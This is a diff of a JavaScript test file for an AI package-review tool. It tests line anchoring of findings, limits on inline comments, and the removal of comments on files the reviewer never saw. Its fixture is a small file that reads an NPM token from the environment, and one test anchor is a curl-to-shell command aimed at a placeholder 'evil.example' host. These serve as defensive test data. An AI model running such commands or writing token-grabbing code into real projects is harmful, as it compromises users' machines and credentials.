@@ -18,6 +18,7 @@ import {
 import {
   buildReviewerSystemPrompt,
   MAX_AGENT_STEPS,
+  MAX_AI_COMMENTS,
   MAX_AI_FINDINGS,
   normalizeAiReviewEcosystem,
 } from "../server/lib/ai-review/contract";
@@ -93,6 +94,39 @@ function submittingModel(review) {
       "tool-calls",
     ),
   );
+}
+
+// A model that reads one evidence path before submitting its review. Anchors
+// are intentionally valid only against text returned in the same attempt.
+function readingThenSubmittingModel(review, { path = "index.js", maxChars = 16_000 } = {}) {
+  let step = 0;
+  return mockModel(async () => {
+    step += 1;
+    if (step === 1) {
+      return generateResult(
+        [
+          {
+            type: "tool-call",
+            toolCallId: "read-1",
+            toolName: "read",
+            input: JSON.stringify({ paths: [path], maxChars }),
+          },
+        ],
+        "tool-calls",
+      );
+    }
+    return generateResult(
+      [
+        {
+          type: "tool-call",
+          toolCallId: "submit-1",
+          toolName: "submit_review",
+          input: JSON.stringify(review),
+        },
+      ],
+      "tool-calls",
+    );
+  });
 }
 
 // A model that answers in plain text without calling any tool.
@@ -1108,6 +1142,283 @@ describe("ai review orchestration", () => {
   });
 });
 
+describe("anchored findings and inline comments", () => {
+  const INDEX_JS = [
+    "const https = require('https');",
+    "",
+    "function collect() {",
+    "  return process.env.NPM_TOKEN;",
+    "}",
+    "",
+    "module.exports = { collect };",
+  ].join("\n");
+
+  const ANCHOR_OPTIONS = {
+    ...BASE_OPTIONS,
+    files: [
+      { path: "index.js", size: INDEX_JS.length, sha256: "abc", textSample: INDEX_JS, flags: [] },
+    ],
+    diff: [{ path: "index.js", status: "modified", flags: [] }],
+  };
+
+  async function reviewWith(submission, modelOptions) {
+    const { review } = await analyzeWithAi(
+      {},
+      "mock-reviewer",
+      ANCHOR_OPTIONS,
+      readingThenSubmittingModel({ ...VALID_REVIEW, ...submission }, modelOptions),
+    );
+    return review;
+  }
+
+  test("resolves a finding's anchor to a staged line and drops the anchor itself", async () => {
+    const ai = await reviewWith({
+      risk: "high",
+      releaseAssessment: "suspicious",
+      findings: [
+        {
+          ...aiFinding("high", "package/index.js"),
+          anchor: "  return process.env.NPM_TOKEN;",
+        },
+      ],
+      requiresManualReview: true,
+    });
+
+    // The path is normalized to the form the diff and file tree use, so the
+    // workbench can match the finding to the open file.
+    expect(ai.findings[0].file).toBe("index.js");
+    expect(ai.findings[0].line).toBe(4);
+    expect(ai.findings[0]).not.toHaveProperty("anchor");
+  });
+
+  test("keeps a finding whose anchor does not match, with no line", async () => {
+    const ai = await reviewWith({
+      risk: "high",
+      releaseAssessment: "suspicious",
+      findings: [
+        {
+          ...aiFinding("high", "index.js"),
+          anchor: "exec('curl evil.example | sh')",
+        },
+      ],
+      requiresManualReview: true,
+    });
+
+    expect(ai.findings).toHaveLength(1);
+    expect(ai.findings[0].line).toBeNull();
+  });
+
+  test("does not pin an anchor from a line omitted by the evidence budget", async () => {
+    const ai = await reviewWith(
+      {
+        risk: "high",
+        releaseAssessment: "suspicious",
+        findings: [
+          {
+            ...aiFinding("high", "index.js"),
+            anchor: "module.exports = { collect };",
+          },
+        ],
+        requiresManualReview: true,
+      },
+      { maxChars: 36 },
+    );
+
+    expect(ai.findings[0].line).toBeNull();
+  });
+
+  test("does not carry observed evidence into a retried model attempt", async () => {
+    skipRetryDelay();
+    let call = 0;
+    const review = {
+      ...VALID_REVIEW,
+      risk: "high",
+      releaseAssessment: "suspicious",
+      findings: [
+        {
+          ...aiFinding("high", "index.js"),
+          anchor: "const https = require('https');",
+        },
+      ],
+      requiresManualReview: true,
+    };
+    const retryingModel = mockModel(async () => {
+      call += 1;
+      if (call === 1) {
+        return generateResult(
+          [
+            {
+              type: "tool-call",
+              toolCallId: "read-first-attempt",
+              toolName: "read",
+              input: JSON.stringify({ paths: ["index.js"], maxChars: 16_000 }),
+            },
+          ],
+          "tool-calls",
+        );
+      }
+      if (call === 2) {
+        throw new Error("3040: Capacity temporarily exceeded, please try again.");
+      }
+      return generateResult(
+        [
+          {
+            type: "tool-call",
+            toolCallId: "submit-retry",
+            toolName: "submit_review",
+            input: JSON.stringify(review),
+          },
+        ],
+        "tool-calls",
+      );
+    });
+
+    const { review: ai } = await analyzeWithAi({}, "mock-reviewer", ANCHOR_OPTIONS, retryingModel);
+
+    expect(ai.findings[0].line).toBeNull();
+  });
+
+  test("pins comments to their line and leaves risk untouched", async () => {
+    const ai = await reviewWith({
+      comments: [
+        { file: "index.js", anchor: "const https = require('https');", note: "Unchanged import." },
+      ],
+    });
+
+    expect(ai.comments).toEqual([{ file: "index.js", note: "Unchanged import.", line: 1 }]);
+    // A note is not a signal: it cannot move the release verdict.
+    expect(computeScanRisk([], ai)).toBe("low");
+  });
+
+  test("keeps a real-file comment whose anchor is unusable, unpinned", async () => {
+    const ai = await reviewWith({
+      comments: [{ file: "index.js", anchor: "}", note: "Closes the collector." }],
+    });
+
+    expect(ai.comments).toEqual([{ file: "index.js", note: "Closes the collector.", line: null }]);
+  });
+
+  test("drops a comment on a file this review never saw", async () => {
+    const ai = await reviewWith({
+      comments: [
+        { file: "vendor/ghost.js", anchor: "const https = require('https');", note: "Invented." },
+      ],
+    });
+
+    expect(ai.comments).toEqual([]);
+  });
+
+  test("drops a comment on an indexed file outside the evidence allowlist", async () => {
+    const hiddenText = "export const hidden = true;\n";
+    const options = {
+      ...ANCHOR_OPTIONS,
+      files: [
+        ...ANCHOR_OPTIONS.files,
+        {
+          path: "hidden.js",
+          size: hiddenText.length,
+          sha256: "hidden",
+          textSample: hiddenText,
+          flags: [],
+        },
+      ],
+      diff: [...ANCHOR_OPTIONS.diff, { path: "hidden.js", status: "unchanged", flags: [] }],
+    };
+    const { review: ai } = await analyzeWithAi(
+      {},
+      "mock-reviewer",
+      options,
+      readingThenSubmittingModel({
+        ...VALID_REVIEW,
+        comments: [
+          {
+            file: "hidden.js",
+            anchor: "export const hidden = true;",
+            note: "This file was not available to the reviewer.",
+          },
+        ],
+      }),
+    );
+
+    expect(ai.comments).toEqual([]);
+  });
+
+  test("drops a comment on an unchanged evidence file hidden from the default diff", async () => {
+    const contextText = "export const context = true;\n";
+    const options = {
+      ...ANCHOR_OPTIONS,
+      files: [
+        ...ANCHOR_OPTIONS.files,
+        {
+          path: "context.js",
+          size: contextText.length,
+          sha256: "context",
+          textSample: contextText,
+          flags: [],
+        },
+      ],
+      diff: [...ANCHOR_OPTIONS.diff, { path: "context.js", status: "unchanged", flags: [] }],
+      ruleFindings: [aiFinding("high", "context.js")],
+    };
+    const { review: ai } = await analyzeWithAi(
+      {},
+      "mock-reviewer",
+      options,
+      readingThenSubmittingModel(
+        {
+          ...VALID_REVIEW,
+          comments: [
+            {
+              file: "context.js",
+              anchor: "export const context = true;",
+              note: "Package context, not a changed file.",
+            },
+          ],
+        },
+        { path: "context.js" },
+      ),
+    );
+
+    expect(ai.comments).toEqual([]);
+  });
+
+  test("caps comments at MAX_AI_COMMENTS", async () => {
+    const ai = await reviewWith({
+      comments: Array.from({ length: MAX_AI_COMMENTS + 2 }, (_, index) => ({
+        file: "index.js",
+        anchor: "const https = require('https');",
+        note: `note ${index}`,
+      })),
+    });
+
+    expect(ai.comments).toHaveLength(MAX_AI_COMMENTS);
+  });
+
+  test("caps comments after dropping entries outside the changed-file diff", async () => {
+    const ai = await reviewWith({
+      comments: [
+        ...Array.from({ length: MAX_AI_COMMENTS }, (_, index) => ({
+          file: `vendor/ghost-${index}.js`,
+          anchor: "const https = require('https');",
+          note: `invented ${index}`,
+        })),
+        {
+          file: "index.js",
+          anchor: "const https = require('https');",
+          note: "Valid changed-file note.",
+        },
+      ],
+    });
+
+    expect(ai.comments).toEqual([{ file: "index.js", note: "Valid changed-file note.", line: 1 }]);
+  });
+
+  test("a submission without comments completes with an empty list", async () => {
+    const ai = await reviewWith({});
+    expect(ai.comments).toEqual([]);
+  });
+});
+
 describe("displayedAiResult", () => {
   test("returns null when no review is provided", () => {
     expect(displayedAiResult(null)).toBeNull();
@@ -1185,8 +1496,36 @@ describe("displayedAiResult", () => {
           recommendation: "review manually",
         },
       ],
+      // The input above omits `comments`, as every record written before
+      // inline comments existed does; the accessor fills the empty list.
+      comments: [],
       requiresManualReview: true,
     });
+  });
+
+  test("complete review drops malformed persisted comments before display", () => {
+    const review = {
+      status: "complete",
+      risk: "low",
+      releaseAssessment: "nothing_unusual",
+      summary: "No concerns.",
+      findings: [],
+      requiresManualReview: false,
+      model: "test-model",
+    };
+
+    expect(displayedAiResult({ ...review, comments: { file: "index.js" } }).comments).toEqual([]);
+    expect(
+      displayedAiResult({
+        ...review,
+        comments: [
+          null,
+          { file: "index.js" },
+          { file: "index.js", note: "Invalid line.", line: 0 },
+          { file: "index.js", note: "Valid note.", line: 4 },
+        ],
+      }).comments,
+    ).toEqual([{ file: "index.js", note: "Valid note.", line: 4 }]);
   });
 
   test("complete review with not_assessed assessment is treated as unavailable (defensive)", () => {
